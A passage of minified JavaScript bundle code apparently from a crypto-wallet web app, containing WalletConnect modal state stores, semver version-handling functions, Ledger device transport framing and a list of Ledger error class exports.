                    n ? e(o.splice(0)) : i || (i = Promise.resolve().then( () => {
                        i = void 0,
                        a && e(o.splice(0))
                    }
                    ))
                }
                );
                return a = !0,
                () => {
                    a = !1,
                    l()
                }
            }
            const f = h({
                history: ["ConnectWallet"],
                view: "ConnectWallet",
                data: void 0
            })
              , p = {
                state: f,
                subscribe: t => u(f, () => t(f)),
                push(t, e) {
                    t !== f.view && (f.view = t,
                    e && (f.data = e),
                    f.history.push(t))
                },
                reset(t) {
                    f.view = t,
                    f.history = [t]
                },
                replace(t) {
                    f.history.length > 1 && (f.history[f.history.length - 1] = t,
                    f.view = t)
                },
                goBack() {
                    if (f.history.length > 1) {
                        f.history.pop();
                        const [t] = f.history.slice(-1);
                        f.view = t
                    }
                },
                setData(t) {
                    f.data = t
                }
            }
              , g = {
                WALLETCONNECT_DEEPLINK_CHOICE: "WALLETCONNECT_DEEPLINK_CHOICE",
                WCM_VERSION: "WCM_VERSION",
                RECOMMENDED_WALLET_AMOUNT: 9,
                isMobile: () => "undefined" != typeof window && Boolean(window.matchMedia("(pointer:coarse)").matches || /Android|webOS|iPhone|iPad|iPod|BlackBerry|Opera Mini/u.test(navigator.userAgent)),
                isAndroid: () => g.isMobile() && navigator.userAgent.toLowerCase().includes("android"),
                isIos() {
                    const t = navigator.userAgent.toLowerCase();
                    return g.isMobile() && (t.includes("iphone") || t.includes("ipad"))
                },
                isHttpUrl: t => t.startsWith("http://") || t.startsWith("https://"),
                isArray: t => Array.isArray(t) && t.length > 0,
                isTelegram: () => "undefined" != typeof window && (Boolean(window.TelegramWebviewProxy) || Boolean(window.Telegram) || Boolean(window.TelegramWebviewProxyProto)),
                formatNativeUrl(t, e, n) {
                    if (g.isHttpUrl(t))
                        return this.formatUniversalUrl(t, e, n);
                    let r = t;
                    return r.includes("://") || (r = t.replaceAll("/", "").replaceAll(":", ""),
                    r = `${r}://`),
                    r.endsWith("/") || (r = `${r}/`),
                    this.setWalletConnectDeepLink(r, n),
                    `${r}wc?uri=${encodeURIComponent(e)}`
                },
                formatUniversalUrl(t, e, n) {
                    if (!g.isHttpUrl(t))
                        return this.formatNativeUrl(t, e, n);
                    let r = t;
                    if (r.startsWith("https://t.me")) {
                        const t = Buffer.from(e).toString("base64").replace(/[=]/g, "");
                        r.endsWith("/") && (r = r.slice(0, -1)),
                        this.setWalletConnectDeepLink(r, n);
                        const i = new URL(r);
                        return i.searchParams.set("startapp", t),
                        i.toString()
                    }
                    return r.endsWith("/") || (r = `${r}/`),
                    this.setWalletConnectDeepLink(r, n),
                    `${r}wc?uri=${encodeURIComponent(e)}`
                },
                wait: async t => new Promise(e => {
                    setTimeout(e, t)
                }
                ),
                openHref(t, e) {
                    const n = this.isTelegram() ? "_blank" : e;
                    window.open(t, n, "noreferrer noopener")
                },
                setWalletConnectDeepLink(t, e) {
                    try {
                        localStorage.setItem(g.WALLETCONNECT_DEEPLINK_CHOICE, JSON.stringify({
                            href: t,
                            name: e
                        }))
                    } catch (t) {
                        console.info("Unable to set WalletConnect deep link")
                    }
                },
                setWalletConnectAndroidDeepLink(t) {
                    try {
                        const [e] = t.split("?");
                        localStorage.setItem(g.WALLETCONNECT_DEEPLINK_CHOICE, JSON.stringify({
                            href: e,
                            name: "Android"
                        }))
                    } catch (t) {
                        console.info("Unable to set WalletConnect android deep link")
                    }
                },
                removeWalletConnectDeepLink() {
                    try {
                        localStorage.removeItem(g.WALLETCONNECT_DEEPLINK_CHOICE)
                    } catch (t) {
                        console.info("Unable to remove WalletConnect deep link")
                    }
                },
                setModalVersionInStorage() {
                    try {
                        "undefined" != typeof localStorage && localStorage.setItem(g.WCM_VERSION, "2.7.0")
                    } catch (t) {
                        console.info("Unable to set Web3Modal version in storage")
                    }
                },
                getWalletRouterData() {
                    var t;
                    const e = null == (t = p.state.data) ? void 0 : t.Wallet;
                    if (!e)
                        throw new Error('Missing "Wallet" view data');
                    return e
                }
            }
              , w = h({
                enabled: "undefined" != typeof location && (location.hostname.includes("localhost") || location.protocol.includes("https")),
                userSessionId: "",
                events: [],
                connectedWalletId: void 0
            })
              , m = {
                state: w,
                subscribe: t => u(w.events, () => t(function(t) {
                    const e = c.get(t);
                    "production" === {
                        NODE_ENV: "production"
                    }.MODE || e || console.warn("Please use proxy object");
                    const [n,r,i] = e;
                    return i(n, r(), void 0)
                }(w.events[w.events.length - 1]))),
                initialize() {
                    w.enabled && void 0 !== (null == crypto ? void 0 : crypto.randomUUID) && (w.userSessionId = crypto.randomUUID())
                },
                setConnectedWalletId(t) {
                    w.connectedWalletId = t
                },
                click(t) {
                    if (w.enabled) {
                        const e = {
                            type: "CLICK",
                            name: t.name,
                            userSessionId: w.userSessionId,
                            timestamp: Date.now(),
                            data: t
                        };
                        w.events.push(e)
                    }
                },
                track(t) {
                    if (w.enabled) {
                        const e = {
                            type: "TRACK",
                            name: t.name,
                            userSessionId: w.userSessionId,
                            timestamp: Date.now(),
                            data: t
                        };
                        w.events.push(e)
                    }
                },
                view(t) {
                    if (w.enabled) {
                        const e = {
                            type: "VIEW",
                            name: t.name,
                            userSessionId: w.userSessionId,
                            timestamp: Date.now(),
                            data: t
                        };
                        w.events.push(e)
                    }
                }
            }
              , y = h({
                chains: void 0,
                walletConnectUri: void 0,
                isAuth: !1,
                isCustomDesktop: !1,
                isCustomMobile: !1,
                isDataLoaded: !1,
                isUiLoaded: !1
            })
              , v = {
                state: y,
                subscribe: t => u(y, () => t(y)),
                setChains(t) {
                    y.chains = t
                },
                setWalletConnectUri(t) {
                    y.walletConnectUri = t
                },
                setIsCustomDesktop(t) {
                    y.isCustomDesktop = t
                },
                setIsCustomMobile(t) {
                    y.isCustomMobile = t
                },
                setIsDataLoaded(t) {
                    y.isDataLoaded = t
                },
                setIsUiLoaded(t) {
                    y.isUiLoaded = t
                },
                setIsAuth(t) {
                    y.isAuth = t
                }
            }
              , M = h({
                projectId: "",
                mobileWallets: void 0,
                desktopWallets: void 0,
                walletImages: void 0,
                chains: void 0,
                enableAuthMode: !1,
                enableExplorer: !0,
                explorerExcludedWalletIds: void 0,
                explorerRecommendedWalletIds: void 0,
                termsOfServiceUrl: void 0,
                privacyPolicyUrl: void 0
            })
              , N = {
                state: M,
                subscribe: t => u(M, () => t(M)),
                setConfig(t) {
                    var e, n;
                    m.initialize(),
                    v.setChains(t.chains),
                    v.setIsAuth(Boolean(t.enableAuthMode)),
                    v.setIsCustomMobile(Boolean(null == (e = t.mobileWallets) ? void 0 : e.length)),
                    v.setIsCustomDesktop(Boolean(null == (n = t.desktopWallets) ? void 0 : n.length)),
                    g.setModalVersionInStorage(),
                    Object.assign(M, t)
                }
            };
            var I = Object.defineProperty
              , E = Object.getOwnPropertySymbols
              , A = Object.prototype.hasOwnProperty
              , b = Object.prototype.propertyIsEnumerable
              , _ = (t, e, n) => e in t ? I(t, e, {
                enumerable: !0,
                configurable: !0,
                writable: !0,
                value: n
            }) : t[e] = n;
            const T = "https://explorer-api.walletconnect.com"
              , x = "wcm"
              , D = "js-2.7.0";
            async function k(t, e) {
                const n = ( (t, e) => {
                    for (var n in e || (e = {}))
                        A.call(e, n) && _(t, n, e[n]);
                    if (E)
                        for (var n of E(e))
                            b.call(e, n) && _(t, n, e[n]);
                    return t
                }
                )({
                    sdkType: x,
                    sdkVersion: D
                }, e)
                  , r = new URL(t,T);
                return r.searchParams.append("projectId", N.state.projectId),
                Object.entries(n).forEach( ([t,e]) => {
                    e && r.searchParams.append(t, String(e))
                }
                ),
                (await fetch(r)).json()
            }
            const L = async t => k("/w3m/v1/getDesktopListings", t)
              , S = async t => k("/w3m/v1/getMobileListings", t)
              , C = async t => k("/w3m/v1/getAllListings", t)
              , j = t => `${T}/w3m/v1/getWalletImage/${t}?projectId=${N.state.projectId}&sdkType=${x}&sdkVersion=${D}`
              , O = t => `${T}/w3m/v1/getAssetImage/${t}?projectId=${N.state.projectId}&sdkType=${x}&sdkVersion=${D}`;
            var U = Object.defineProperty
              , W = Object.getOwnPropertySymbols
              , z = Object.prototype.hasOwnProperty
              , R = Object.prototype.propertyIsEnumerable
              , P = (t, e, n) => e in t ? U(t, e, {
                enumerable: !0,
                configurable: !0,
                writable: !0,
                value: n
            }) : t[e] = n;
            const F = g.isMobile()
              , B = h({
                wallets: {
                    listings: [],
                    total: 0,
                    page: 1
                },
                search: {
                    listings: [],
                    total: 0,
                    page: 1
                },
                recomendedWallets: []
            })
              , V = {
                state: B,
                async getRecomendedWallets() {
                    const {explorerRecommendedWalletIds: t, explorerExcludedWalletIds: e} = N.state;
                    if ("NONE" === t || "ALL" === e && !t)
                        return B.recomendedWallets;
                    if (g.isArray(t)) {
                        const e = {
                            recommendedIds: t.join(",")
                        }
                          , {listings: n} = await C(e)
                          , r = Object.values(n);
                        r.sort( (e, n) => t.indexOf(e.id) - t.indexOf(n.id)),
                        B.recomendedWallets = r
                    } else {
                        const {chains: t, isAuth: n} = v.state
                          , r = null == t ? void 0 : t.join(",")
                          , i = g.isArray(e)
                          , o = {
                            page: 1,
                            sdks: n ? "auth_v1" : void 0,
                            entries: g.RECOMMENDED_WALLET_AMOUNT,
                            chains: r,
                            version: 2,
                            excludedIds: i ? e.join(",") : void 0
                        }
                          , {listings: s} = F ? await S(o) : await L(o);
                        B.recomendedWallets = Object.values(s)
                    }
                    return B.recomendedWallets
                },
                async getWallets(t) {
                    const e = ( (t, e) => {
                        for (var n in e || (e = {}))
                            z.call(e, n) && P(t, n, e[n]);
                        if (W)
                            for (var n of W(e))
                                R.call(e, n) && P(t, n, e[n]);
                        return t
                    }
                    )({}, t)
                      , {explorerRecommendedWalletIds: n, explorerExcludedWalletIds: r} = N.state
                      , {recomendedWallets: i} = B;
                    if ("ALL" === r)
                        return B.wallets;
                    i.length ? e.excludedIds = i.map(t => t.id).join(",") : g.isArray(n) && (e.excludedIds = n.join(",")),
                    g.isArray(r) && (e.excludedIds = [e.excludedIds, r].filter(Boolean).join(",")),
                    v.state.isAuth && (e.sdks = "auth_v1");
                    const {page: o, search: s} = t
                      , {listings: a, total: c} = F ? await S(e) : await L(e)
                      , l = Object.values(a)
                      , d = s ? "search" : "wallets";
                    return B[d] = {
                        listings: [...B[d].listings, ...l],
                        total: c,
                        page: null != o ? o : 1
                    },
                    {
                        listings: l,
                        total: c
                    }
                },
                getWalletImageUrl: t => j(t),
                getAssetImageUrl: t => O(t),
                resetSearch() {
                    B.search = {
                        listings: [],
                        total: 0,
                        page: 1
                    }
                }
            }
              , Q = h({
                open: !1
            })
              , Y = {
                state: Q,
                subscribe: t => u(Q, () => t(Q)),
                open: async t => new Promise(e => {
                    const {isUiLoaded: n, isDataLoaded: r} = v.state;
                    if (g.removeWalletConnectDeepLink(),
                    v.setWalletConnectUri(null == t ? void 0 : t.uri),
                    v.setChains(null == t ? void 0 : t.chains),
                    p.reset("ConnectWallet"),
                    n && r)
                        Q.open = !0,
                        e();
                    else {
                        const t = setInterval( () => {
                            const n = v.state;
                            n.isUiLoaded && n.isDataLoaded && (clearInterval(t),
                            Q.open = !0,
                            e())
                        }
                        , 200)
                    }
                }
                ),
                close() {
                    Q.open = !1
                }
            };
            var G = Object.defineProperty
              , Z = Object.getOwnPropertySymbols
              , H = Object.prototype.hasOwnProperty
              , J = Object.prototype.propertyIsEnumerable
              , X = (t, e, n) => e in t ? G(t, e, {
                enumerable: !0,
                configurable: !0,
                writable: !0,
                value: n
            }) : t[e] = n;
            const q = h({
                themeMode: "undefined" != typeof matchMedia && matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light"
            })
              , K = {
                state: q,
                subscribe: t => u(q, () => t(q)),
                setThemeConfig(t) {
                    const {themeMode: e, themeVariables: n} = t;
                    e && (q.themeMode = e),
                    n && (q.themeVariables = ( (t, e) => {
                        for (var n in e || (e = {}))
                            H.call(e, n) && X(t, n, e[n]);
                        if (Z)
                            for (var n of Z(e))
                                J.call(e, n) && X(t, n, e[n]);
                        return t
                    }
                    )({}, n))
                }
            }
              , $ = h({
                open: !1,
                message: "",
                variant: "success"
            })
              , tt = {
                state: $,
                subscribe: t => u($, () => t($)),
                openToast(t, e) {
                    $.open = !0,
                    $.message = t,
                    $.variant = e
                },
                closeToast() {
                    $.open = !1
                }
            }
        },
        2525(t, e, n) {
            const r = n(7638)
              , i = n(560);
            t.exports = (t, e, n) => {
                const o = [];
                let s = null
                  , a = null;
                const c = t.sort( (t, e) => i(t, e, n));
                for (const t of c)
                    r(t, e, n) ? (a = t,
                    s || (s = t)) : (a && o.push([s, a]),
                    a = null,
                    s = null);
                s && o.push([s, null]);
                const l = [];
                for (const [t,e] of o)
                    t === e ? l.push(t) : e || t !== c[0] ? e ? t === c[0] ? l.push(`<=${e}`) : l.push(`${t} - ${e}`) : l.push(`>=${t}`) : l.push("*");
                const d = l.join(" || ")
                  , h = "string" == typeof e.raw ? e.raw : String(e);
                return d.length < h.length ? d : e
            }
        },
        2938(t, e, n) {
            const r = n(3908);
            t.exports = (t, e) => new r(t,e).major
        },
        3007(t, e, n) {
            const r = n(3908);
            t.exports = (t, e, n, i, o) => {
                "string" == typeof n && (o = i,
                i = n,
                n = void 0);
                try {
                    return new r(t instanceof r ? t.version : t,n).inc(e, i, o).version
                } catch (t) {
                    return null
                }
            }
        },
        3146(t, e, n) {
            "use strict";
            var r = n(7760);
            n.o(r, "InsufficientSignerPermissionsError") && n.d(e, {
                InsufficientSignerPermissionsError: function() {
                    return r.InsufficientSignerPermissionsError
                }
            });
            var i = n(7748);
            n.o(i, "InsufficientSignerPermissionsError") && n.d(e, {
                InsufficientSignerPermissionsError: function() {
                    return i.InsufficientSignerPermissionsError
                }
            });
            var o = n(6701);
            n.o(o, "InsufficientSignerPermissionsError") && n.d(e, {
                InsufficientSignerPermissionsError: function() {
                    return o.InsufficientSignerPermissionsError
                }
            });
            var s = n(7291);
            n.o(s, "InsufficientSignerPermissionsError") && n.d(e, {
                InsufficientSignerPermissionsError: function() {
                    return s.InsufficientSignerPermissionsError
                }
            });
            var a = n(3323);
            n.o(a, "InsufficientSignerPermissionsError") && n.d(e, {
                InsufficientSignerPermissionsError: function() {
                    return a.InsufficientSignerPermissionsError
                }
            });
            var c = n(5427);
            n.o(c, "InsufficientSignerPermissionsError") && n.d(e, {
                InsufficientSignerPermissionsError: function() {
                    return c.InsufficientSignerPermissionsError
                }
            });
            var l = n(8714);
            n.o(l, "InsufficientSignerPermissionsError") && n.d(e, {
                InsufficientSignerPermissionsError: function() {
                    return l.InsufficientSignerPermissionsError
                }
            })
        },
        3207(t, e, n) {
            "use strict";
            var r = n(4450)
              , i = {
                data: Buffer.alloc(0),
                dataLength: 0,
                sequence: 0
            };
            e.A = function(t, e) {
                return {
                    makeBlocks: function(n) {
                        var r, i, o = Buffer.concat([(r = n.length,
                        i = Buffer.alloc(2),
                        i.writeUInt16BE(r, 0),
                        i), n]), s = e - 5, a = Math.ceil(o.length / s);
                        o = Buffer.concat([o, Buffer.alloc(a * s - o.length + 1).fill(0)]);
                        for (var c = [], l = 0; l < a; l++) {
                            var d = Buffer.alloc(5);
                            d.writeUInt16BE(t, 0),
                            d.writeUInt8(5, 2),
                            d.writeUInt16BE(l, 3);
                            var h = o.slice(l * s, (l + 1) * s);
                            c.push(Buffer.concat([d, h]))
                        }
                        return c
                    },
                    reduceResponse: function(e, n) {
                        var o = e || i
                          , s = o.data
                          , a = o.dataLength
                          , c = o.sequence;
                        if (n.readUInt16BE(0) !== t)
                            throw new r.TransportError("Invalid channel","InvalidChannel");
                        if (5 !== n.readUInt8(2))
                            throw new r.TransportError("Invalid tag","InvalidTag");
                        if (n.readUInt16BE(3) !== c)
                            throw new r.TransportError("Invalid sequence","InvalidSequence");
                        e || (a = n.readUInt16BE(5)),
                        c++;
                        var l = n.slice(e ? 5 : 7);
                        return (s = Buffer.concat([s, l])).length > a && (s = s.slice(0, a)),
                        {
                            data: s,
                            dataLength: a,
                            sequence: c
                        }
                    },
                    getReducedResult: function(t) {
                        if (t && t.dataLength === t.data.length)
                            return t.data
                    }
                }
            }
        },
        3323(t) {
            class e {
                constructor(t) {
                    this.serverLoading = t.server_loading,
                    this.connectingWallet = t.connecting_wallet,
                    this.unknownError = t.unknown_error,
                    this.waitingTransactionConfirmation = t.waiting_transaction_confirmation,
                    this.walletNotFoundError = t.wallet_not_found_error,
                    this.connectionRejected = t.connection_rejected,
                    this.transactionRejected = t.transaction_rejected,
                    this.insufficientGas = t.insufficient_gas,
                    this.insufficientBalance = t.insufficient_balance
                }
                toJSON() {
                    return {
                        server_loading: this.serverLoading,
                        connecting_wallet: this.connectingWallet,
                        unknown_error: this.unknownError,
                        waiting_transaction_confirmation: this.waitingTransactionConfirmation,
                        wallet_not_found_error: this.walletNotFoundError,
                        connection_rejected: this.connectionRejected,
                        transaction_rejected: this.transactionRejected,
                        insufficient_gas: this.insufficientGas,
                        insufficient_balance: this.insufficientBalance
                    }
                }
                static fromJSON(t) {
                    return new e(t)
                }
            }
            t.exports = {
                ModalTextsDTO: e
            }
        },
        3522(t, e, n) {
            "use strict";
            var r = n(8013);
            n.o(r, "InsufficientSignerPermissionsError") && n.d(e, {
                InsufficientSignerPermissionsError: function() {
                    return r.InsufficientSignerPermissionsError
                }
            });
            var i = n(5385);
            n.o(i, "InsufficientSignerPermissionsError") && n.d(e, {
                InsufficientSignerPermissionsError: function() {
                    return i.InsufficientSignerPermissionsError
                }
            });
            var o = n(4723);
            n.o(o, "InsufficientSignerPermissionsError") && n.d(e, {
                InsufficientSignerPermissionsError: function() {
                    return o.InsufficientSignerPermissionsError
                }
            })
        },
        3874(t, e, n) {
            const r = n(8311);
            t.exports = (t, e) => {
                try {
                    return new r(t,e).range || "*"
                } catch (t) {
                    return null
                }
            }
        },
        3904(t, e, n) {
            const r = Symbol("SemVer ANY");
            class i {
                static get ANY() {
                    return r
                }
                constructor(t, e) {
                    if (e = o(e),
                    t instanceof i) {
                        if (t.loose === !!e.loose)
                            return t;
                        t = t.value
                    }
                    t = t.trim().split(/\s+/).join(" "),
                    l("comparator", t, e),
                    this.options = e,
                    this.loose = !!e.loose,
                    this.parse(t),
                    this.semver === r ? this.value = "" : this.value = this.operator + this.semver.version,
                    l("comp", this)
                }
                parse(t) {
                    const e = this.options.loose ? s[a.COMPARATORLOOSE] : s[a.COMPARATOR]
                      , n = t.match(e);
                    if (!n)
                        throw new TypeError(`Invalid comparator: ${t}`);
                    this.operator = void 0 !== n[1] ? n[1] : "",
                    "=" === this.operator && (this.operator = ""),
                    n[2] ? this.semver = new d(n[2],this.options.loose) : this.semver = r
                }
                toString() {
                    return this.value
                }
                test(t) {
                    if (l("Comparator.test", t, this.options.loose),
                    this.semver === r || t === r)
                        return !0;
                    if ("string" == typeof t)
                        try {
                            t = new d(t,this.options)
                        } catch (t) {
                            return !1
                        }
                    return c(t, this.operator, this.semver, this.options)
                }
                intersects(t, e) {
                    if (!(t instanceof i))
                        throw new TypeError("a Comparator is required");
                    return "" === this.operator ? "" === this.value || new h(t.value,e).test(this.value) : "" === t.operator ? "" === t.value || new h(this.value,e).test(t.semver) : !((e = o(e)).includePrerelease && ("<0.0.0-0" === this.value || "<0.0.0-0" === t.value) || !e.includePrerelease && (this.value.startsWith("<0.0.0") || t.value.startsWith("<0.0.0")) || (!this.operator.startsWith(">") || !t.operator.startsWith(">")) && (!this.operator.startsWith("<") || !t.operator.startsWith("<")) && (this.semver.version !== t.semver.version || !this.operator.includes("=") || !t.operator.includes("=")) && !(c(this.semver, "<", t.semver, e) && this.operator.startsWith(">") && t.operator.startsWith("<")) && !(c(this.semver, ">", t.semver, e) && this.operator.startsWith("<") && t.operator.startsWith(">")))
                }
            }
            t.exports = i;
            const o = n(8587)
              , {safeRe: s, t: a} = n(9718)
              , c = n(2111)
              , l = n(7272)
              , d = n(3908)
              , h = n(8311)
        },
        3908(t, e, n) {
            const r = n(7272)
              , {MAX_LENGTH: i, MAX_SAFE_INTEGER: o} = n(6874)
              , {safeRe: s, safeSrc: a, t: c} = n(9718)
              , l = n(8587)
              , {compareIdentifiers: d} = n(1123);
            class h {
                constructor(t, e) {
                    if (e = l(e),
                    t instanceof h) {
                        if (t.loose === !!e.loose && t.includePrerelease === !!e.includePrerelease)
                            return t;
                        t = t.version
                    } else if ("string" != typeof t)
                        throw new TypeError(`Invalid version. Must be a string. Got type "${typeof t}".`);
                    if (t.length > i)
                        throw new TypeError(`version is longer than ${i} characters`);
                    r("SemVer", t, e),
                    this.options = e,
                    this.loose = !!e.loose,
                    this.includePrerelease = !!e.includePrerelease;
                    const n = t.trim().match(e.loose ? s[c.LOOSE] : s[c.FULL]);
                    if (!n)
                        throw new TypeError(`Invalid Version: ${t}`);
                    if (this.raw = t,
                    this.major = +n[1],
                    this.minor = +n[2],
                    this.patch = +n[3],
                    this.major > o || this.major < 0)
                        throw new TypeError("Invalid major version");
                    if (this.minor > o || this.minor < 0)
                        throw new TypeError("Invalid minor version");
                    if (this.patch > o || this.patch < 0)
                        throw new TypeError("Invalid patch version");
                    n[4] ? this.prerelease = n[4].split(".").map(t => {
                        if (/^[0-9]+$/.test(t)) {
                            const e = +t;
                            if (e >= 0 && e < o)
                                return e
                        }
                        return t
                    }
                    ) : this.prerelease = [],
                    this.build = n[5] ? n[5].split(".") : [],
                    this.format()
                }
                format() {
                    return this.version = `${this.major}.${this.minor}.${this.patch}`,
                    this.prerelease.length && (this.version += `-${this.prerelease.join(".")}`),
                    this.version
                }
                toString() {
                    return this.version
                }
                compare(t) {
                    if (r("SemVer.compare", this.version, this.options, t),
                    !(t instanceof h)) {
                        if ("string" == typeof t && t === this.version)
                            return 0;
                        t = new h(t,this.options)
                    }
                    return t.version === this.version ? 0 : this.compareMain(t) || this.comparePre(t)
                }
                compareMain(t) {
                    return t instanceof h || (t = new h(t,this.options)),
                    d(this.major, t.major) || d(this.minor, t.minor) || d(this.patch, t.patch)
                }
                comparePre(t) {
                    if (t instanceof h || (t = new h(t,this.options)),
                    this.prerelease.length && !t.prerelease.length)
                        return -1;
                    if (!this.prerelease.length && t.prerelease.length)
                        return 1;
                    if (!this.prerelease.length && !t.prerelease.length)
                        return 0;
                    let e = 0;
                    do {
                        const n = this.prerelease[e]
                          , i = t.prerelease[e];
                        if (r("prerelease compare", e, n, i),
                        void 0 === n && void 0 === i)
                            return 0;
                        if (void 0 === i)
                            return 1;
                        if (void 0 === n)
                            return -1;
                        if (n !== i)
                            return d(n, i)
                    } while (++e)
                }
                compareBuild(t) {
                    t instanceof h || (t = new h(t,this.options));
                    let e = 0;
                    do {
                        const n = this.build[e]
                          , i = t.build[e];
                        if (r("build compare", e, n, i),
                        void 0 === n && void 0 === i)
                            return 0;
                        if (void 0 === i)
                            return 1;
                        if (void 0 === n)
                            return -1;
                        if (n !== i)
                            return d(n, i)
                    } while (++e)
                }
                inc(t, e, n) {
                    if (t.startsWith("pre")) {
                        if (!e && !1 === n)
                            throw new Error("invalid increment argument: identifier is empty");
                        if (e) {
                            const t = new RegExp(`^${this.options.loose ? a[c.PRERELEASELOOSE] : a[c.PRERELEASE]}$`)
                              , n = `-${e}`.match(t);
                            if (!n || n[1] !== e)
                                throw new Error(`invalid identifier: ${e}`)
                        }
                    }
                    switch (t) {
                    case "premajor":
                        this.prerelease.length = 0,
                        this.patch = 0,
                        this.minor = 0,
                        this.major++,
                        this.inc("pre", e, n);
                        break;
                    case "preminor":
                        this.prerelease.length = 0,
                        this.patch = 0,
                        this.minor++,
                        this.inc("pre", e, n);
                        break;
                    case "prepatch":
                        this.prerelease.length = 0,
                        this.inc("patch", e, n),
                        this.inc("pre", e, n);
                        break;
                    case "prerelease":
                        0 === this.prerelease.length && this.inc("patch", e, n),
                        this.inc("pre", e, n);
                        break;
                    case "release":
                        if (0 === this.prerelease.length)
                            throw new Error(`version ${this.raw} is not a prerelease`);
                        this.prerelease.length = 0;
                        break;
                    case "major":
                        0 === this.minor && 0 === this.patch && 0 !== this.prerelease.length || this.major++,
                        this.minor = 0,
                        this.patch = 0,
                        this.prerelease = [];
                        break;
                    case "minor":
                        0 === this.patch && 0 !== this.prerelease.length || this.minor++,
                        this.patch = 0,
                        this.prerelease = [];
                        break;
                    case "patch":
                        0 === this.prerelease.length && this.patch++,
                        this.prerelease = [];
                        break;
                    case "pre":
                        {
                            const t = Number(n) ? 1 : 0;
                            if (0 === this.prerelease.length)
                                this.prerelease = [t];
                            else {
                                let r = this.prerelease.length;
                                for (; --r >= 0; )
                                    "number" == typeof this.prerelease[r] && (this.prerelease[r]++,
                                    r = -2);
                                if (-1 === r) {
                                    if (e === this.prerelease.join(".") && !1 === n)
                                        throw new Error("invalid increment argument: identifier already exists");
                                    this.prerelease.push(t)
                                }
                            }
                            if (e) {
                                let r = [e, t];
                                !1 === n && (r = [e]),
                                0 === d(this.prerelease[0], e) ? isNaN(this.prerelease[1]) && (this.prerelease = r) : this.prerelease = r
                            }
                            break
                        }
                    default:
                        throw new Error(`invalid increment argument: ${t}`)
                    }
                    return this.raw = this.format(),
                    this.build.length && (this.raw += `+${this.build.join(".")}`),
                    this
                }
            }
            t.exports = h
        },
        3927(t, e, n) {
            const r = n(909);
            t.exports = (t, e) => t.sort( (t, n) => r(t, n, e))
        },
        3999(t, e, n) {
            const r = n(560);
            t.exports = (t, e, n) => 0 !== r(t, e, n)
        },
        4089(t, e, n) {
            const r = n(560);
            t.exports = (t, e, n) => r(t, e, n) >= 0
        },
        4277(t, e, n) {
            const r = n(909);
            t.exports = (t, e) => t.sort( (t, n) => r(n, t, e))
        },
        4450(t, e, n) {
            "use strict";
            n.r(e),
            n.d(e, {
                AccountAwaitingSendPendingOperations: () => u,
                AccountNameRequiredError: () => d,
                AccountNotSupported: () => h,
                AmountRequired: () => f,
                BluetoothRequired: () => p,
                BtcUnmatchedApp: () => g,
                CantOpenDevice: () => w,
                CantScanQRCode: () => me,
                CashAddrNotSupported: () => m,
                CeloAppPleaseEnableContractData: () => R,
                ClaimRewardsFeesWarning: () => y,
                CurrencyNotSupported: () => v,
                DBNotReset: () => Ue,
                DBWrongPassword: () => Oe,
                DeviceAppVerifyNotSupported: () => M,
                DeviceExtractOnboardingStateError: () => j,
                DeviceGenuineSocketEarlyClose: () => N,
                DeviceHalted: () => _,
                DeviceInOSUExpected: () => b,
                DeviceMangementKitError: () => Ge,
                DeviceNameInvalid: () => T,
                DeviceNeedsRestart: () => k,
                DeviceNotGenuineError: () => I,
                DeviceOnDashboardExpected: () => E,
                DeviceOnDashboardUnexpected: () => A,
                DeviceOnboardingStatePollingError: () => O,
                DeviceShouldStayInApp: () => ce,
                DeviceSocketFail: () => x,
                DeviceSocketNoBulkStatus: () => D,
                DisabledTransactionBroadcastError: () => ze,
                DisconnectedDevice: () => S,
                DisconnectedDeviceDuringOperation: () => C,
                DustLimit: () => Se,
                ETHAddressNonEIP: () => we,
                EnpointConfigError: () => U,
                EthAppPleaseEnableContractData: () => W,
                ExpertModeRequired: () => ee,
                FeeEstimationFailed: () => P,
                FeeNotLoaded: () => ye,
                FeeNotLoadedSwap: () => ve,
                FeeRequired: () => Me,
                FeeTooHigh: () => Ne,
                FirmwareNotRecognized: () => F,
                FirmwareOrAppUpdateRequired: () => De,
                GasLessThanEstimate: () => kt,
                GenuineCheckFailed: () => _e,
                HardResetFail: () => B,
                HwTransportError: () => Pe,
                HwTransportErrorType: () => Re,
                InvalidAddress: () => Q,
                InvalidAddressBecauseDestinationIsAlsoSource: () => G,
                InvalidNonce: () => Y,
                InvalidXRPTag: () => V,
                LanguageNotFound: () => Ce,
                LatestFirmwareVersionRequired: () => H,
                LatestMCUInstalledError: () => Z,
                LedgerAPI4xx: () => Te,
                LedgerAPI5xx: () => xe,
                LedgerAPIError: () => K,
                LedgerAPIErrorWithMessage: () => $,
                LedgerAPINotAvailable: () => tt,
                LockedDeviceError: () => Ye,
                MCUNotGenuineToDashboard: () => Ft,
                ManagerAppAlreadyInstalledError: () => et,
                ManagerAppDepInstallRequired: () => rt,
                ManagerAppDepUninstallRequired: () => it,
                ManagerAppRelyOnBTCError: () => nt,
                ManagerDeviceLockedError: () => ot,
                ManagerFirmwareNotEnoughSpaceError: () => st,
                ManagerNotEnoughSpaceError: () => at,
                ManagerUninstallBTCDep: () => ct,
                MaxFeeTooLow: () => jt,
                MaybeKeepTronAccountAlive: () => xt,
                MissingSwapPayloadParamaters: () => fe,
                NanoSNotSupported: () => X,
                NetworkDown: () => lt,
                NetworkError: () => dt,
                NoAccessToCamera: () => At,
                NoAddressesFound: () => ht,
                NoDBPathGiven: () => je,
                NotEnoughBalance: () => ut,
                NotEnoughBalanceBecauseDestinationNotCreated: () => It,
                NotEnoughBalanceFees: () => ft,
                NotEnoughBalanceInParentAccount: () => Mt,
                NotEnoughBalanceSwap: () => pt,
                NotEnoughBalanceToDelegate: () => gt,
                NotEnoughGas: () => bt,
                NotEnoughGasSwap: () => _t,
                NotEnoughSpendableBalance: () => Nt,
                NotEnoughToRestake: () => yt,
                NotEnoughToStake: () => Et,
                NotEnoughToUnstake: () => vt,
                NotSupportedLegacyAddress: () => Dt,
                OpReturnDataSizeLimit: () => Le,
                PairingFailed: () => Ae,
                PasswordIncorrectError: () => Ut,
                PasswordsDontMatchError: () => Ot,
                PeerRemovedPairing: () => be,
                PendingOperation: () => Ie,
                PinNotSet: () => te,
                PriorityFeeHigherThanMaxFee: () => Ct,
                PriorityFeeTooHigh: () => St,
                PriorityFeeTooLow: () => Lt,
                RecipientRequired: () => Bt,
                RecommendSubAccountsToEmpty: () => Wt,
                RecommendUndelegation: () => zt,
                ReplacementTransactionUnderpriced: () => ke,
                RestakeNotEnoughStakedBalanceLeft: () => mt,
                SequenceNumberError: () => We,
                SolAppPleaseEnableContractData: () => z,
